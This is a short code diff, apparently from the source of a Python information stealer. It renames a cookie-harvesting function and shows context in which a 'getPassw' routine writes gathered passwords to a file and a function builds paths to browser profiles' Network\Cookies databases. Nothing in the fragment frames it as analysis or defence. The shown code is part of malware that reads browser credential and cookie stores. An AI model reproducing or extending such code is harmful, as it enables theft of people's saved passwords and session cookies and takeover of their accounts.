@@ -513,7 +513,7 @@ def getPassw(path, arg):
     writeforfile(Passw, 'passw')
 
 Cookies = []    
-def cookies(self, name: str, path: str, profile: str) -> None:
+def getCookie(self, name: str, path: str, profile: str) -> None:
         path += '\\' + profile + '\\Network\\Cookies'
         if not os.path.isfile(path):
             return
